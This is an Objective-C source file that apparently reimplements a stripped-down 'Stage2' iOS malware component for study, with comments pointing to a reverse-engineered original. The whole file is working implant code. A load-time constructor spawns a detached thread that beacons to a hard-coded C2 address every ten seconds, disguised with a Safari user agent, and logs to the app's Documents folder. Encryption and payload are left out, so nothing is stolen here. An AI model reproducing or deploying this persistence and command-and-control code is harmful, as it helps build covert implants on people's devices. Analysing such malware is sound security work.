#import <Foundation/Foundation.h>
#import <CFNetwork/CFNetwork.h>

/* ============================================================
 * Minimal Stage2 (plain heartbeat): persistent C2 connection.
 *   - constructor entry
 *   - GCD dispatch_source timer (like real Stage2 FUN_00080404)
 *   - every 10s POST /event with PLAINTEXT body: ts + {"ts":..,"t":"hb"}
 * No show.html, no encryption -- isolate persistence + link.
 * ============================================================ */

static NSString *const kBaseURL = @"http://192.168.36.253:18889";
static NSString *const kEventPath = @"/event";
static NSString *const kUserAgent =
    @"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) "
    @"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1";

static NSData *PLHTTPRequest(NSString *urlString, NSString *method, NSData *postBody, NSDictionary *extraHeaders, NSInteger *statusOut);

/* ---------------- HTTP helper (CFNetwork) ---------------- */

static NSData *PLHTTPRequest(NSString *urlString, NSString *method, NSData *postBody, NSDictionary *extraHeaders, NSInteger *statusOut) {
    if (statusOut) *statusOut = -1;
    CFStringRef cfUrl = CFStringCreateWithCString(NULL, urlString.UTF8String, kCFStringEncodingUTF8);
    if (!cfUrl) return nil;
    CFURLRef url = CFURLCreateWithString(NULL, cfUrl, NULL);
    CFRelease(cfUrl);
    if (!url) return nil;

    CFHTTPMessageRef req = CFHTTPMessageCreateRequest(
        NULL,
        (__bridge CFStringRef)method,
        url,
        kCFHTTPVersion1_1);
    CFRelease(url);
    if (!req) return nil;

    CFHTTPMessageSetHeaderFieldValue(req, CFSTR("User-Agent"),
        (__bridge CFStringRef)kUserAgent);
    [extraHeaders enumerateKeysAndObjectsUsingBlock:^(NSString *k, NSString *v, BOOL *stop) {
        CFHTTPMessageSetHeaderFieldValue(req, (__bridge CFStringRef)k,
            (__bridge CFStringRef)v);
    }];
    if (postBody && postBody.length > 0) {
        CFHTTPMessageSetBody(req, (__bridge CFDataRef)postBody);
        CFHTTPMessageSetHeaderFieldValue(req, CFSTR("Content-Type"),
            CFSTR("application/json"));
    }

    CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(NULL, req);
    CFRelease(req);
    if (!stream) return nil;

    if (!CFReadStreamOpen(stream)) {
        CFRelease(stream);
        return nil;
    }

    NSMutableData *out = [NSMutableData data];
    uint8_t buf[8192];
    CFIndex n;
    while ((n = CFReadStreamRead(stream, buf, sizeof(buf))) > 0) {
        [out appendBytes:buf length:(NSUInteger)n];
    }

    CFHTTPMessageRef resp = (CFHTTPMessageRef)CFReadStreamCopyProperty(
        stream, kCFStreamPropertyHTTPResponseHeader);
    if (statusOut && resp) {
        *statusOut = CFHTTPMessageGetResponseStatusCode(resp);
    }
    if (resp) CFRelease(resp);
    CFReadStreamClose(stream);
    CFRelease(stream);
    return out;
}

/* ---------------- heartbeat engine (plain) ---------------- */

static NSString *SaveDir(void) {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    return paths.firstObject ?: @"/tmp";
}

static void PLSendHeartbeat(void) {
    NSDate *now = [NSDate date];
    NSString *ts = [NSString stringWithFormat:@"%.0f", now.timeIntervalSince1970 * 1000.0];
    NSDictionary *payload = @{
        @"ts": ts,
        @"t": @"hb",
    };
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
    NSString *plainString = [ts stringByAppendingString:
        [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
    NSData *plain = [plainString dataUsingEncoding:NSUTF8StringEncoding];

    NSString *url = [kBaseURL stringByAppendingString:kEventPath];
    NSInteger status = 0;
    NSDictionary *headers = @{ @"x-ts": ts };
    NSData *resp = PLHTTPRequest(url, @"POST", plain, headers, &status);

    NSString *logFile = [SaveDir() stringByAppendingPathComponent:@"heartbeat_log.txt"];
    NSString *logEntry = [NSString stringWithFormat:@"%@ - ts=%@ status=%ld resp=%zu\n",
                          [NSDate date], ts, (long)status, resp.length];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logFile];
    if (!fh) {
        [logEntry writeToFile:logFile atomically:YES encoding:NSUTF8StringEncoding error:nil];
    } else {
        [fh seekToEndOfFile];
        [fh writeData:[logEntry dataUsingEncoding:NSUTF8StringEncoding]];
        [fh closeFile];
    }
    NSLog(@"[stage2] heartbeat(plain): %zuB status=%ld resp=%zu",
          plain.length, (long)status, resp.length);
}

/* ---------------- entry point (pthread resident loop, like real Stage2) ---------------- */

#import <pthread.h>

static void *HeartbeatLoop(void *arg) {
    @autoreleasepool {
        NSLog(@"[stage2] heartbeat(plain) started (pthread)");
        for (;;) {
            @autoreleasepool {
                PLSendHeartbeat();
                [NSThread sleepForTimeInterval:10.0];
            }
        }
    }
    return NULL;
}

__attribute__((constructor))
static void Stage2Entry(void) {
    static pthread_t gThread;
    if (gThread) return;
    if (pthread_create(&gThread, NULL, HeartbeatLoop, NULL) != 0) {
        NSLog(@"[stage2] pthread_create failed");
        return;
    }
    pthread_detach(gThread);
}